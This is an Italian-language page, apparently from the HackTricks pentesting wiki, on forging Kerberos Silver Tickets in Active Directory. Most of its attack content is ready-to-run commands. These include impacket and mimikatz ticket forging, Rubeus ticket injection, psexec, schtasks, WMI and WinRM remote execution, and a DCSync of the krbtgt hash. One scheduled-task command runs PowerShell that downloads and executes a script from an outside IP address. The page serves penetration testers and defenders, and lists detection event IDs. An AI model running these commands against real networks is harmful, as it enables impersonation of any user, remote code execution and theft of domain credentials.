# Silver Ticket

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'impossibile - **stiamo assumendo!** (_richiesta conoscenza fluente di polacco scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

## Silver ticket

L'attacco **Silver Ticket** coinvolge lo sfruttamento dei ticket di servizio in ambienti Active Directory (AD). Questo metodo si basa sull'**acquisizione dell'hash NTLM di un account di servizio**, come ad esempio un account di computer, per falsificare un ticket del servizio di concessione dei ticket (TGS). Con questo ticket falsificato, un attaccante può accedere a servizi specifici sulla rete, **fingendosi qualsiasi utente**, puntando tipicamente ai privilegi amministrativi. Si sottolinea che l'utilizzo di chiavi AES per la falsificazione dei ticket è più sicuro e meno rilevabile.

Per la creazione dei ticket, vengono utilizzati diversi strumenti in base al sistema operativo:

### Su Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Su Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Il servizio CIFS è evidenziato come un obiettivo comune per accedere al file system della vittima, ma altri servizi come HOST e RPCSS possono essere sfruttati anche per compiti e query WMI.

## Servizi disponibili

| Tipo di servizio                          | Silver Tickets del servizio                                               |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>A seconda del sistema operativo anche:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In alcune occasioni puoi semplicemente richiedere: WINRM</p> |
| Attività pianificate                            | HOST                                                                       |
| Condivisione file di Windows, anche psexec            | CIFS                                                                       |
| Operazioni LDAP, inclusa DCSync           | LDAP                                                                       |
| Strumenti di amministrazione remota del server Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Utilizzando **Rubeus** puoi **richiedere tutti** questi ticket utilizzando il parametro:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Eventi ID dei Silver tickets

* 4624: Accesso all'account
* 4634: Disconnessione dell'account
* 4672: Accesso amministrativo

## Abuso dei ticket di servizio

Negli esempi seguenti immaginiamo che il ticket sia ottenuto impersonando l'account amministratore.

### CIFS

Con questo ticket sarai in grado di accedere alla cartella `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una parte del file system remoto semplicemente facendo qualcosa come:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
È anche possibile ottenere una shell all'interno dell'host o eseguire comandi arbitrari utilizzando **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Con questa autorizzazione è possibile generare attività pianificate su computer remoti ed eseguire comandi arbitrari:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con questi ticket puoi **eseguire WMI nel sistema vittima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trova ulteriori informazioni su **wmiexec** nella seguente pagina:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Con l'accesso winrm su un computer puoi **accedervi** e persino ottenere un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Controlla la seguente pagina per imparare **altre modalità di connessione con un host remoto utilizzando winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per accedervi.
{% endhint %}

### LDAP

Con questo privilegio puoi scaricare il database DC utilizzando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Scopri di più su DCSync** nella seguente pagina:

## Riferimenti
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera di hacking** e a hackerare l'impossibile - **stiamo assumendo!** (_richiesta fluente di polacco scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
